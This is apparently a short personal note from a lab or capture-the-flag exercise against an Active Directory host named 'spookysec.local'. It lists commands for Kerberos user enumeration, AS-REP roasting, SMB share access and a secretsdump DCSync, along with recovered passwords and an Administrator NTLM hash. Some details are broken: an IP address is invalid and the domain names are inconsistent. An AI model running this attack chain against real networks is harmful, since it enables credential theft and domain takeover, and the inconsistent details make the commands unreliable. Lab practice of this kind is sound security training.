@@ -1,0 +1,27 @@
+spookysec.local
+
+Userenumeration with kerbrute (all users)
+-------------------------------
+./kerbrute userenum --dc spookysec.local -d spookysec.local /usr/share/wordlists/rockyou.txt
+
+cut the space (" ") till 8 fields
+-----------------------------------
+cut -d " " -f 8 x.txt > valid_username.txt
+
+AS-REP roasting
+----------------
+impacket-GetNpusers spookey.sec --no-pass -userfile valid_username.txt
+
+svc-admin:management2005
+
+smbclient //10.303.442.3/backup -U svc-admin 
+
+Get backupcredential.txt
+-------------------------
+backup@spookysec.local:backup2517860
+
+Use impacket-secrets to get NTLM hash
+--------------------------------------
+#secretsdump.py -just-dc spooky.local/backup:'backup2517860'@10.10.37.51
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
